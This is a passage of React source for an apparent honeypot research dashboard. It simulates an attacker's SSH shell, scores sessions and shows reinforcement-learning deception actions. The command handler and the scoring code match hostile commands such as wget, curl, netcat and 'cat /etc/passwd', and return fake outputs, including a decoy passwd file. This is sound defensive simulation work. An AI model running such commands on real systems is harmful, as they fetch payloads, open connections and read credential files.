        evt.spoofedInfo.toLowerCase().includes(logSearch.toLowerCase()) ||
        evt.attackerResponse.toLowerCase().includes(logSearch.toLowerCase());
      
      const matchTactic = selectedTactic === "ALL" || evt.tactic === selectedTactic;
      
      return matchSearch && matchTactic;
    })
    .sort((a, b) => {
      let valA = a[sortField];
      let valB = b[sortField];
      
      if (typeof valA === 'string' && typeof valB === 'string') {
        const comparison = valA.localeCompare(valB);
        return sortDir === 'asc' ? comparison : -comparison;
      }
      
      if (typeof valA === 'number' && typeof valB === 'number') {
        return sortDir === 'asc' ? valA - valB : valB - valA;
      }
      
      return 0;
    });

  const handleSort = (field: keyof DeceptionEvent) => {
    if (sortField === field) {
      setSortDir(prev => prev === "asc" ? "desc" : "asc");
    } else {
      setSortField(field);
      setSortDir("asc");
    }
  };

  const [manualInput, setManualInput] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  const typingIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const processingTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const terminalEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (terminalEndRef.current) {
      terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLog, typingText]);

  const handleTerminalClick = () => {
    inputRef.current?.focus();
  };

  const handleManualSubmit = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      const cmd = manualInput.trim();
      if (!cmd) return;
      setManualInput("");

      if (cmd === 'clear') {
        if (liveSessionCommands.length > 0) {
          const id = `SESS-LIVE-${Math.floor(1000 + Math.random() * 9000)}`;
          const archivedObj: SessionRecord = {
            id,
            name: `User Manual Session #${pastSessions.length + 1}`,
            timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
            commands: [...liveSessionCommands],
            sqsData: [...sqsHistory]
          };
          setPastSessions(prev => [archivedObj, ...prev]);
          setLiveSessionCommands([]);
        }
        setTerminalLog([]);
        setSqsHistory([{ time: 0, sqs: 10 }]);
        setDeceptionEvents([]);
        setActiveProfile(null);
        setCurrentAction(null);
        setActiveTrappingStep(0);
        return;
      }

      // Interrupt running simulation
      if (typingIntervalRef.current) clearInterval(typingIntervalRef.current);
      if (processingTimeoutRef.current) clearTimeout(processingTimeoutRef.current);
      setProfileQueue([]);
      setActiveProfile("manual");
      setTypingText("");

      // Provide mock output for manual commands
      let mockOut = `bash: ${cmd.split(" ")[0]}: command not found`;
      if (cmd.startsWith("echo ")) mockOut = cmd.substring(5);
      else if (cmd.includes("whoami")) mockOut = "root";
      else if (cmd.includes("pwd")) mockOut = "/root";
      else if (cmd.includes("ls")) mockOut = "file1.txt  file2.txt  payload.sh  .hidden_dir  prod_db_v3_backup.sql";
      else if (cmd.includes("wget")) mockOut = "Connecting to remote... 200 OK\nSaved.";
      else if (cmd.includes("nmap")) mockOut = "Starting Nmap...\nHost is up.\n22/tcp open ssh";
      else if (cmd.includes("chmod")) mockOut = "";
      else if (cmd.includes("nc ") || cmd.includes("netcat")) mockOut = "Connection established.";
      else if (cmd.includes("cat /etc/passwd")) mockOut = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndb_vault_sync:x:1021:1021::/var/lib/db:/bin/bash";

      executeCommand(cmd, mockOut);
    }
  };

  const launchProfile = (profileName: keyof typeof PROFILES) => {
      if (typingIntervalRef.current) clearInterval(typingIntervalRef.current);
      if (processingTimeoutRef.current) clearTimeout(processingTimeoutRef.current);
      
      if (liveSessionCommands.length > 0) {
        const id = `SESS-LIVE-${Math.floor(1000 + Math.random() * 9000)}`;
        const archivedObj: SessionRecord = {
          id,
          name: `User Manual Session #${pastSessions.length + 1}`,
          timestamp: new Date().toLocaleTimeString('en-US', { hour12: false }),
          commands: [...liveSessionCommands],
          sqsData: [...sqsHistory]
        };
        setPastSessions(prev => [archivedObj, ...prev]);
        setLiveSessionCommands([]);
      }

      setActiveProfile(profileName);
      setTerminalLog([]);
      setTypingText("");
      setProfileQueue([...PROFILES[profileName]]);
      setCommandHistory([]);
      setRlState({
         num_commands: 0,
         time_alive: 0,
         unique_commands: 0,
         last_command: 0,
         repetitive: 0,
         command_type: 0
      });
      setSqsHistory([{time: 0, sqs: 10}]);
      setDeceptionEvents([...INITIAL_DECEPTION_EVENTS]);
      setCurrentAction(null);
      setActiveTrappingStep(0);
  };

  useEffect(() => {
     if (profileQueue.length > 0 && typingText === "" && !typingIntervalRef.current) {
         const currentCmd = profileQueue[0];
         let i = 0;
         setActiveTrappingStep(1); // 1. Attacker is typing/performing action
         typingIntervalRef.current = setInterval(() => {
             i++;
             setTypingText(currentCmd.cmd.slice(0, i));
             if (i >= currentCmd.cmd.length) {
                 clearInterval(typingIntervalRef.current!);
                 typingIntervalRef.current = null;
                 
                 processingTimeoutRef.current = setTimeout(() => {
                     executeCommand(currentCmd.cmd, currentCmd.out);
                 }, 400);
             }
         }, Math.random() * 50 + 30); // Variable typing speed
     }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [profileQueue, typingText]);

  // Automated Replay ticks and typewrite effects
  const replayTimeoutRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    if (!isReplaying || !replaySession || replayIsPaused) {
      if (replayTimeoutRef.current) {
        clearTimeout(replayTimeoutRef.current);
        replayTimeoutRef.current = null;
      }
      return;
    }

    const currentCmds = replaySession.commands;
    if (replayCommandIndex >= currentCmds.length) {
      // Replay completed
      return;
    }

    // Type out the current command
    const activeCmd = currentCmds[replayCommandIndex];
    let currentChar = 0;
    setReplayTypingText("");

    const typingSpeed = 35 / replaySpeed;

    const interval = setInterval(() => {
      currentChar++;
      setReplayTypingText(activeCmd.cmd.substring(0, currentChar));
      
      if (currentChar >= activeCmd.cmd.length) {
        clearInterval(interval);
        
        // Wait and advance command index
        replayTimeoutRef.current = setTimeout(() => {
          setReplayCommandIndex(prev => prev + 1);
        }, 1300 / replaySpeed);
      }
    }, typingSpeed);

    return () => {
      clearInterval(interval);
      if (replayTimeoutRef.current) {
        clearTimeout(replayTimeoutRef.current);
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isReplaying, replaySession, replayCommandIndex, replayIsPaused, replaySpeed]);

  const executeCommand = (cmd: string, out: string) => {
      setTypingText("");
      setTerminalLog(prev => [...prev, { type: 'cmd', text: cmd }]);
      setActiveTrappingStep(2); // 2. Decision evaluation sequence
      
      setCommandHistory(prev => {
          const newHist = [...prev, cmd];
          const cmdType = classifyCommand(cmd);
          const numCmds = newHist.length;
          const uniqueCmds = new Set(newHist).size;
          const lastCmdEnc = encodeCommand(cmd);
          const isRep = newHist.filter(c => c === cmd).length > 1 ? 1 : 0;
          
          setRlState({
             num_commands: numCmds,
             time_alive: numCmds * 5 + Math.floor(Math.random() * 5 + 130),
             unique_commands: uniqueCmds,
             last_command: lastCmdEnc,
             repetitive: isRep,
             command_type: cmdType
          });
          
          const action = decideAction({ command_type: cmdType });
          setCurrentAction(action);
          
          setSqsHistory(prevSqs => {
              const last = prevSqs[prevSqs.length - 1];
              let nextSqs = last.sqs;
              
              if (cmdType === 3) {
                  // Scanner: Increases steadily
                  nextSqs += 10;
              } else if (cmdType === 2) {
                  // Malware: Massive spike, especially on payload execution/download
                  if (cmd.includes("wget") || cmd.includes("./") || cmd.includes("curl")) {
                      nextSqs += 45; // Massive spike
                  } else {
                      nextSqs += 15;
                  }
              } else if (cmdType === 1) {
                  // Recon: Moderate steady jumps
                  nextSqs += 15;
              } else {
                  nextSqs += 5;
              }
              
              return [...prevSqs, { time: last.time + 1, sqs: Math.min(100, nextSqs) }];
          });

          // Generate active deception block
          const timeString = new Date().toLocaleTimeString('en-US', { hour12: false });
          const dec = getDeceptionDetail(cmd, downloadTamperMode, sensitiveFileSpoofMode);
          
          // Increment byte feed stat reflecting fake payload sizes
          setBytesSpoofed(prev => prev + Math.floor(Math.random() * 400 + 150));
          
          setDeceptionEvents(prev => [
              ...prev,
              {
                  id: prev.length + 1,
                  timestamp: timeString,
                  cmd: cmd,
                  tactic: dec.tactic,
                  target: dec.target,
                  spoofedInfo: dec.spoofedInfo,
                  attackerResponse: dec.attackerResponse
              }
          ]);

          // Simulate action delay
          const delayMs = action === 1 ? 1800 : 400; // Latency injection takes longer
          
          processingTimeoutRef.current = setTimeout(() => {
              let finalOut = dec.overrideOut !== undefined ? dec.overrideOut : out;
              if (finalOut) {
                  if (cmdType === 1 && action === 4 && dec.overrideOut === undefined) {
                      finalOut = "[DECEPTION ENGAGED: Spoofed Tree Mapping]\n" + finalOut;
                  }
                  if (cmdType === 2 && action === 0 && dec.overrideOut === undefined) {
                      finalOut += "\n\n[SYSTEM ALARM: Payload isolated in sandbox. Analysis initiated.]";
                  }
                  
                  setTerminalLog(plog => [...plog, { type: 'out', text: finalOut }]);
              }
              
              setLiveSessionCommands(prevCmds => [
                  ...prevCmds,
                  {
                      cmd,
                      out: finalOut,
                      tactic: dec.tactic,
                      target: dec.target,
                      spoofedInfo: dec.spoofedInfo,
                      attackerResponse: dec.attackerResponse,
                      timestamp: timeString
                  }
              ]);

              setActiveTrappingStep(3); // 3. Fake Information Served Successfully
              setProfileQueue(pq => pq.slice(1));
          }, delayMs);

          return newHist;
       });
  };

  const currentSqs = sqsHistory[sqsHistory.length - 1].sqs;

  return (
    <div className="min-h-screen bg-[#050907] text-[#22c55e] font-mono flex flex-col p-2 sm:p-4 md:p-6 overflow-y-auto">
      
      {/* Header */}
      <header className="mb-4 flex flex-col sm:flex-row justify-between items-start sm:items-center border-b border-[#14532d] pb-4 px-2">
        <div className="flex items-center gap-3">
          <Shield className="w-8 h-8 text-[#10b981] animate-pulse" />
          <div>
            <h1 className="text-xl sm:text-2xl font-bold text-[#10b981] tracking-tight relative">
              RL-Driven Deception Defense Console
              <span className="absolute -top-1 -right-4 w-2 h-2 bg-[#10b981] rounded-full animate-ping"></span>
            </h1>
            <p className="text-xs text-[#059669] mt-1 uppercase tracking-widest">Master's Thesis Simulation Env: PPO_HONEYPOT_V1</p>
          </div>
        </div>
        <div className="mt-4 sm:mt-0 flex flex-wrap items-center gap-3 text-xs">
          <div className="flex items-center gap-2">
            <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse"></span>
            <span className="text-red-500 uppercase font-semibold">Attacker Containment: Active</span>
          </div>
          <div className="px-3 py-1 bg-gradient-to-r from-emerald-950 to-emerald-900 text-[#34d399] rounded-full border border-emerald-700 font-semibold shadow-[0_0_10px_rgba(16,185,129,0.15)]">
            SANDBOX ZONE: SECURE JAIL [100%]
          </div>
        </div>
      </header>

      {/* Main Grid split evenly into 3 panels for desktop-grade dashboard */}
      <div className="flex-1 grid grid-cols-1 md:grid-cols-12 gap-5 h-full">
        
        {/* PANEL 1: Terminal - The Attack Vector (4/12 width) */}
        <div 
          id="panel-terminal-vector"
          className="md:col-span-12 lg:col-span-4 h-[420px] lg:h-[calc(100vh-140px)] flex flex-col rounded-xl overflow-hidden border border-[#064e3b] shadow-[0_0_20px_rgba(5,150,105,0.05)] bg-[#020617] relative"
          onClick={handleTerminalClick}
        >
          <div className="bg-[#0f172a] h-11 px-4 flex items-center justify-between border-b border-[#1e293b]">
             <div className="flex items-center gap-2">
               <TerminalSquare className="w-4 h-4 text-[#38bdf8]" />
               <span className="text-xs text-[#94a3b8] font-semibold">root@honeypot:~ (Attacker Shell Interface)</span>
             </div>
             <div className="flex gap-1.5">
               <div className="w-3 h-3 rounded-full bg-red-500/10 border border-red-500/40"></div>
               <div className="w-3 h-3 rounded-full bg-yellow-500/10 border border-yellow-500/40"></div>
               <div className="w-3 h-3 rounded-full bg-green-500/10 border border-green-500/40"></div>
             </div>
          </div>
          
          <div className="flex-1 p-4 overflow-y-auto font-mono text-sm leading-relaxed scrollbar-thin scrollbar-thumb-[#1e293b] scrollbar-track-transparent text-[#22c55e]">
            {isReplaying && replaySession ? (
              <>
                <div className="mb-3 text-amber-500 text-xs uppercase tracking-widest border-b border-amber-900 pb-1 flex justify-between items-center">
                  <span className="flex items-center gap-1.5 font-bold">
                    <span className="w-2 h-2 rounded-full bg-amber-500 animate-ping"></span>
                    📼 HISTORIC PLAYBACK ACTIVE
                  </span>
                  <span className="text-amber-400 font-bold bg-amber-950/60 p-0.5 px-2 rounded border border-amber-900 text-[10px]">
                    {replaySession.id}
                  </span>
                </div>

                <div className="text-[#94a3b8] opacity-70 mb-2">Connecting to 10.0.0.5:22...</div>
                <div className="text-[#94a3b8] opacity-70 mb-2 font-mono text-[11px]">SSH Connection Established. Session payload rehydration successful.</div>

                {replaySession.commands.slice(0, replayCommandIndex).map((log, idx) => (
                  <React.Fragment key={idx}>
                    <div className="text-[#38bdf8] mb-1">
                      <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>{log.cmd}
                    </div>
                    {log.out && (
                      <div className="text-[#94a3b8] opacity-85 bg-slate-950/40 p-1.5 rounded border border-[#0f172a] mt-1 mb-2 whitespace-pre-wrap text-[11px]">
                        {log.out}
                      </div>
                    )}
                  </React.Fragment>
                ))}

                {replayCommandIndex < replaySession.commands.length && (
                  <div className="text-[#38bdf8] mb-1">
                    <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                    {replayTypingText}
                    <span className="w-2 h-4 bg-[#38bdf8] inline-block animate-pulse ml-0.5 align-middle"></span>
                  </div>
                )}

                {replayCommandIndex >= replaySession.commands.length && (
                  <div className="text-amber-500 text-xs bg-amber-950/40 p-2 border border-amber-800/40 rounded mt-3 text-center font-bold">
                    ✓ PLAYBACK FULLY COMPLETED. Return to live console view in Replay Panel.
                  </div>
                )}
              </>
            ) : (
              <>
                <div className="mb-3 text-[#059669] text-xs uppercase tracking-widest border-b border-[#064e3b] pb-1">
                  ** Live Advesary Command Telemetry **
                </div>
                
                {/* Seeded initial lines matching historical logins */}
                <div className="text-[#94a3b8] opacity-70 mb-2">Connecting to 10.0.0.5:22...</div>
                <div className="text-[#94a3b8] opacity-70 mb-2">SSH Connection Established. Host keys authorized.</div>
                <div className="text-[#38bdf8] mb-1">
                  <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>ssh root@10.0.0.5 -p 22
                </div>
                <div className="text-[#38bdf8] mb-1">
                  <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>uname -a
                </div>
                <div className="text-[#94a3b8] opacity-85 mb-3">Linux ubuntu 5.4.0-74-generic #83-Ubuntu SMP Tue May 11 17:30:14 UTC 2026 x86_64 x86_64 GNU/Linux</div>

                {terminalLog.map((log, idx) => (
                  <div key={idx} className={`mb-2 whitespace-pre-wrap ${log.type === 'cmd' ? "text-[#38bdf8]" : "text-[#94a3b8] opacity-85 bg-slate-950/40 p-1.5 rounded border border-[#0f172a] mt-1"}`}>
                    {log.type === 'cmd' && <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>}
                    {log.text}
                  </div>
                ))}
                
                {activeProfile && activeProfile !== 'manual' && (typingText || profileQueue.length > 0) ? (
                  <div className="mb-2 text-[#38bdf8]">
                    <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                    {typingText}
                    <span className="w-2 h-4 bg-[#38bdf8] inline-block animate-pulse ml-1 align-middle"></span>
                  </div>
                ) : (
                  <div className="mb-2 text-[#38bdf8] flex items-center">
                    <span className="text-[#e2e8f0] mr-2">root@honeypot:~#</span>
                    <input 
                      ref={inputRef}
                      type="text"
                      value={manualInput}
                      onChange={(e) => setManualInput(e.target.value)}
                      onKeyDown={handleManualSubmit}
                      className="flex-1 bg-transparent border-none outline-none text-[#38bdf8] caret-transparent focus:caret-[#38bdf8]"
                      autoFocus
                      placeholder="Type any command and hit Enter..."
                      spellCheck={false}
                    />
                  </div>
                )}
              </>
            )}
            <div ref={terminalEndRef} />
          </div>
          
          <div className="p-2 border-t border-[#064e3b] bg-slate-950/70 text-[10px] text-[#059669] flex justify-between items-center px-4">
            {isReplaying ? (
              <>
                <span className="text-amber-500 font-bold uppercase tracking-wide">📼 REPLAY CONSOLE • SPEED {replaySpeed}x</span>
                <span className="text-amber-600 font-mono font-bold">
                  STEP {Math.min(replayCommandIndex + 1, replaySession ? replaySession.commands.length : 0)} / {replaySession ? replaySession.commands.length : 0}
                </span>
              </>
            ) : (
              <>
                <span>Terminal Port: 22/tcp</span>
                <span className="animate-pulse text-xs">● Attacker Keyboard Interactive</span>
              </>
            )}
          </div>
          
          {/* Scanline overlay */}
          <div className="pointer-events-none absolute inset-0 bg-[linear-gradient(to_bottom,transparent_50%,rgba(0,0,0,0.2)_51%)] bg-[length:100%_4px] opacity-10"></div>
        </div>

        {/* PANEL 2: Reinforcement Learning & Analytics (4/12 width) */}
        <div 
          id="panel-analytics"
          className="md:col-span-12 lg:col-span-4 flex flex-col gap-4 h-full"
        >
          
          {/* Agent State Vector */}
          <div className="bg-[#022c22]/35 border border-[#065f46] rounded-xl p-4 relative overflow-hidden flex-1 flex flex-col justify-between">
            <div className="absolute top-0 right-0 p-3 opacity-15"><Cpu className="w-16 h-16 text-[#34d399]" /></div>
            <div>
              <h2 className="text-xs uppercase text-[#10b981] font-semibold flex items-center gap-2 mb-3 tracking-wider">
                <Activity className="w-4 h-4 text-emerald-400" /> State Vector Analysis (Honeypot State s_t)
              </h2>
              <p className="text-[10px] text-emerald-600 mb-3 -mt-2">PPO Input dimensions loaded dynamically from active tty streams.</p>
              
              <div className="grid grid-cols-2 gap-3">
                <div className="p-2.5 bg-slate-950/60 border border-[#064e3b] rounded-lg">
                  <span className="text-[9px] text-[#059669] block tracking-widest">COMMAND COUNT</span>
                  <span className="text-lg font-bold text-[#6ee7b7]">{rlState.num_commands}</span>
                </div>
                <div className="p-2.5 bg-slate-950/60 border border-[#064e3b] rounded-lg">
                  <span className="text-[9px] text-[#059669] block tracking-widest">SESSION DURATION</span>
                  <span className="text-lg font-bold text-[#6ee7b7]">{rlState.time_alive}s</span>
                </div>
                <div className="p-2.5 bg-slate-950/60 border border-[#064e3b] rounded-lg">
                  <span className="text-[9px] text-[#059669] block tracking-widest">UNIQUE VALUES</span>
                  <span className="text-md font-bold text-[#34d399]">{rlState.unique_commands}</span>
                </div>
                <div className="p-2.5 bg-slate-950/60 border border-[#064e3b] rounded-lg">
                  <span className="text-[9px] text-[#059669] block tracking-widest">REPETITIVE CHURN</span>
                  <span className={`text-md font-bold ${rlState.repetitive > 0 ? 'text-rose-400' : 'text-[#34d399]'}`}>{rlState.repetitive}</span>
                </div>
                <div className="col-span-2 p-2 bg-[#020617] border border-[#064e3b] rounded flex justify-between items-center text-xs">
                  <span className="text-[10px] text-[#059669] uppercase font-bold">Threat Classifier</span>
                  <span className={`text-xs px-2 py-0.5 rounded font-bold ${
                    rlState.command_type === 1 ? 'bg-purple-950 text-purple-400 border border-purple-800' : 
                    rlState.command_type === 2 ? 'bg-rose-950 text-rose-400 border border-rose-800' :
                    rlState.command_type === 3 ? 'bg-yellow-950 text-yellow-400 border border-yellow-800' :
                    'bg-slate-900 text-slate-400 border border-slate-700'
                  }`}>
                    {rlState.command_type === 1 ? 'RECON (Tactic TA0007)' : rlState.command_type === 2 ? 'MALWARE (Tactic TA0002)' : rlState.command_type === 3 ? 'SCANNER (Tactic TA0043)' : 'NORMAL ACTIVITY'}
                  </span>
                </div>
              </div>
            </div>
            
            <div className="text-[10px] text-emerald-600 bg-emerald-950/40 p-2 rounded border border-emerald-900/30 mt-3">
              * The PPO actor evaluates threat coefficients using historical patterns to predict policy updates.
            </div>
          </div>

          {/* Action Selected */}
          <div className="bg-[#022c22]/35 border border-[#065f46] rounded-xl p-4 flex-1 flex flex-col justify-center items-center text-center relative max-h-[160px]">
            <h2 className="text-[9px] tracking-widest uppercase text-[#059669] absolute top-3 left-4 font-semibold">PPO Optimal Defense Decision</h2>
            
            <AnimatePresence mode="wait">
              <motion.div 
                key={currentAction !== null ? currentAction : 'null'}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="mt-2"
              >
                <div className={`text-lg sm:text-xl font-extrabold tracking-tight mb-1.5 ${
                  currentAction === 1 ? 'text-yellow-400 drop-shadow-[0_0_8px_rgba(250,204,21,0.3)]' :
                  currentAction === 0 ? 'text-emerald-400 drop-shadow-[0_0_8px_rgba(16,185,129,0.3)]' :
                  currentAction === 4 ? 'text-purple-400 drop-shadow-[0_0_8px_rgba(192,132,252,0.3)]' :
                  'text-[#6ee7b7]'
                }`}>
                  {mapActionName(currentAction)}
                </div>
                <div className="text-xs text-[#059669] max-w-[280px] mx-auto min-h-[30px] flex items-center justify-center">
                  {currentAction === 1 && "Stalling connection thread inside TCP dynamic Tar-pit, enforcing artificial delay metrics to thwart scanners."}
                  {currentAction === 0 && "Executing command securely inside memory isolated hypervisor sandbox to trace hacker payloads and collect C2 addresses."}
                  {currentAction === 4 && "Constructing a virtual simulated target schema, outputting generated credentials and decoy database paths."}
                  {currentAction === null && "Awaiting telemetry command streams to evaluate game-play rewards..."}
                </div>
              </motion.div>
            </AnimatePresence>
          </div>

          {/* SQS Graph */}
          <div className="bg-[#022c22]/35 border border-[#065f46] rounded-xl p-4 h-[180px] flex flex-col">
            <div className="flex justify-between items-center mb-1">
              <h2 className="text-[10px] tracking-widest uppercase text-[#059669]">Session Quality Score (SQS)</h2>
              <span className={`text-sm font-bold ${currentSqs > 80 ? 'text-rose-400' : currentSqs > 60 ? 'text-yellow-400' : 'text-[#34d399]'}`}>
                {currentSqs}% (Attacker Focus Level)
              </span>
            </div>
            <p className="text-[9px] text-emerald-600 mb-2">High SQS demonstrates the attacker maintains low suspicion and is active in sandbox.</p>
            <div className="flex-1 min-h-0 w-full relative -ml-4">
              <ResponsiveContainer width="100%" height="100%">
                <AreaChart data={isReplaying && replaySession ? replaySession.sqsData.slice(0, replayCommandIndex + 1) : sqsHistory}>
                  <defs>
                    <linearGradient id="colorSqs" x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor="#10b981" stopOpacity={0.25}/>
                      <stop offset="95%" stopColor="#10b981" stopOpacity={0}/>
                    </linearGradient>
                  </defs>
                  <CartesianGrid strokeDasharray="3 3" stroke="#064e3b" vertical={false} />
                  <XAxis dataKey="time" hide />
                  <YAxis domain={[0, 100]} hide />
                  <Area 
                    type="monotone" 
                    dataKey="sqs" 
                    stroke="#10b981" 
                    strokeWidth={1.5}
                    fillOpacity={1} 
                    fill="url(#colorSqs)" 
                    isAnimationActive={false}
                  />
                </AreaChart>
              </ResponsiveContainer>
            </div>
          </div>

        </div>

        {/* PANEL 3: HONEYPOT SANDBOX & DECEPTION TELEMETRY (4/12 width) - THE DECISIVE ADDITION */}
        <div 
          id="panel-deception-sandbox"
          className="md:col-span-12 lg:col-span-4 flex flex-col gap-4 rounded-xl border border-[#064e3b] bg-slate-950/60 p-4 h-full relative"
        >
          {/* Section title & metrics */}
          <div className="border-b border-emerald-900 pb-2">
            <div className="flex items-center gap-2 mb-1">
              <RefreshCw className="w-5 h-5 text-emerald-400 animate-spin-slow" />
              <h2 className="text-sm uppercase text-[#10b981] font-bold">Deception & Containment Engine</h2>
            </div>
            <div className="flex justify-between mt-2 bg-emerald-950/20 p-2 rounded border border-emerald-900/30 text-[10px] font-sans text-emerald-400">
              <div className="text-center">
                <span className="block text-emerald-600 uppercase text-[8px]">Egress Link</span>
                <span className="font-bold font-mono">0.0.0.0 (BLOCKED)</span>
              </div>
              <div className="text-center border-l border-emerald-900/40 pl-3">
                <span className="block text-emerald-600 uppercase text-[8px]">Mock Traffic Served</span>
                <span className="font-bold font-mono text-yellow-400">{(bytesSpoofed / 1024).toFixed(2)} KB</span>
              </div>
              <div className="text-center border-l border-emerald-900/40 pl-3">
                <span className="block text-emerald-600 uppercase text-[8px]">Deception State</span>
                <span className="font-bold uppercase text-[#10b981] animate-pulse">Engaged</span>
              </div>
            </div>

            {/* Dynamic Sandbox Containment Indicator */}
            <div className="mt-3 bg-[#022c22]/25 p-2 px-3 rounded-lg border border-[#065f46]/40 flex flex-col gap-1.5 shadow-[0_2px_10px_rgba(5,150,105,0.05)]">
              <div className="flex justify-between items-center text-[10px]">
                <div className="flex items-center gap-1.5 font-bold text-[#34d399] tracking-wider uppercase">
                  <span className="relative flex h-2 w-2">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
                  </span>
                  <span>Hypervisor Jailing Status</span>
                </div>
                <div className="flex items-center gap-1 text-xs font-mono font-bold text-[#10b981]">
                  <Shield className="w-3.5 h-3.5 text-[#10b981] animate-pulse" />
                  <span>{sandboxContainment}% SECURE</span>
                </div>
              </div>
              <div className="w-full bg-slate-950 h-2.5 rounded-full p-[1.5px] border border-emerald-900/50 flex">
                <motion.div 
                  initial={{ width: 0 }}
                  animate={{ width: `${sandboxContainment}%` }}
                  transition={{ duration: 1.5, ease: "easeOut" }}
                  className="bg-gradient-to-r from-emerald-600 via-[#10b981] to-teal-400 h-full rounded-full relative"
                >
                  {/* Subtle scan animation reflection inside the bar */}
                  <div className="absolute inset-0 bg-white/10 w-1/3 h-full skew-x-12 animate-pulse rounded-full"></div>
                </motion.div>
              </div>
              <div className="flex justify-between items-center text-[8px] text-emerald-600/90 font-mono">
                <span>NAMESPACE CONTROL: CHROOT_JAIL</span>
                <span>ACTIVE QUARANTINE</span>
              </div>
            </div>
          </div>

          {/* Interactive Navigation tabs for Honeypot actions */}
          <div className="flex p-0.5 bg-slate-950 border border-emerald-900 rounded-lg text-xs">
            <button 
              onClick={() => setActiveDeceptionTab('illusion')}
              className={`flex-1 py-1 px-1.2 rounded-md font-medium transition-all ${activeDeceptionTab === 'illusion' ? 'bg-[#064e3b] text-emerald-300 font-bold border border-emerald-700' : 'text-emerald-600 hover:text-emerald-400'}`}
            >
              Illusion vs Reality
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('feed')}
              className={`flex-1 py-1 px-1.2 rounded-md font-medium transition-all ${activeDeceptionTab === 'feed' ? 'bg-[#064e3b] text-emerald-300 font-bold border border-emerald-700' : 'text-emerald-600 hover:text-emerald-400'}`}
            >
              Feed Stream
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('pipeline')}
              className={`flex-1 py-1 px-1.2 rounded-md font-medium transition-all ${activeDeceptionTab === 'pipeline' ? 'bg-[#064e3b] text-emerald-300 font-bold border border-emerald-700' : 'text-emerald-600 hover:text-emerald-400'}`}
            >
              Decision Loop
            </button>
            <button 
              onClick={() => setActiveDeceptionTab('replay')}
              className={`flex-1 py-1 px-1.2 rounded-md font-medium transition-all ${activeDeceptionTab === 'replay' ? 'bg-[#064e3b] text-emerald-300 font-bold border border-emerald-700' : 'text-emerald-700 hover:text-emerald-400'}`}
            >
              replays
            </button>
          </div>

          {/* Tab content view */}
          <div className="flex-1 overflow-y-auto pr-1">
            
            {/* VIEW A: Attacker Illusion vs Hypervisor Reality */}
            {activeDeceptionTab === 'illusion' && (
              <div className="space-y-3">
                <div className="p-2.5 bg-yellow-950/20 border border-yellow-800/40 rounded-lg text-xs leading-relaxed text-justify">
                  <span className="text-yellow-400 font-bold flex items-center gap-1.5 mb-1 text-[11px]">
                    <Lock className="w-3.5 h-3.5" /> High-Fidelity Jailing Mechanism
                  </span>
                  <p className="text-[#94a3b8] scale-[0.98] origin-left">
                    The attacker is isolated inside virtual namespace jails. Commands do not execute on host bare-metal. File lookups are intercept-mapped and served copies, while real system processes are hidden completely.
                  </p>
                </div>

                {/* Real-Time Decoy Injection Policy Controls */}
                <div className="p-3 bg-[#0d2a1d]/60 border border-emerald-800/60 rounded-lg text-xs space-y-3.5 shadow-inner">
                  <div className="flex items-center gap-1.5 text-emerald-400 font-bold border-b border-emerald-900/60 pb-1.5 uppercase tracking-wide">
                    <Sliders className="w-4 h-4 text-emerald-400 animate-pulse" />
                    <span>Real-Time Decoy Injection Policy</span>
                  </div>

                  {/* 1. Download File Tampering Option */}
                  <div>
                    <label className="text-[10px] text-emerald-500 font-bold block mb-1 uppercase tracking-wider">
                      File Downloader Poisoning
                    </label>
                    <div className="grid grid-cols-2 gap-1.5">
                      <button
                        onClick={() => setDownloadTamperMode("CORRUPT_EOF")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          downloadTamperMode === "CORRUPT_EOF"
                            ? "bg-yellow-950/60 border-yellow-500 text-yellow-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Appends a bad CRC32 value and null-bytes block at the End of File (EOF)"
                      >
                        ⚡ EOF CORRUPTION
                      </button>
                      <button
                        onClick={() => setDownloadTamperMode("TRUNCATED_90")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          downloadTamperMode === "TRUNCATED_90"
                            ? "bg-rose-950/60 border-rose-500 text-rose-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Closes TCP socket stream prematurely at 90% of file size"
                      >
                        🛑 90% TRUNCATION
                      </button>
                      <button
                        onClick={() => setDownloadTamperMode("POISONED_HEADER")}
                        className={`p-1.5 rounded text-[9px] font-mono border text-left transition-all cursor-pointer ${
                          downloadTamperMode === "POISONED_HEADER"
                            ? "bg-[#2e1065]/60 border-purple-500 text-purple-300 font-bold"
                            : "bg-slate-950/80 border-emerald-900/60 text-emerald-600 hover:text-emerald-400"
                        }`}
                        title="Injects passive tracing tracking codes inside payload header"
                      >
                        🧬 HEADER TRACKING
                      </button>
                      <button
                        onClick={() => setDownloadTamperMode("MOCK_SUCCESS")}
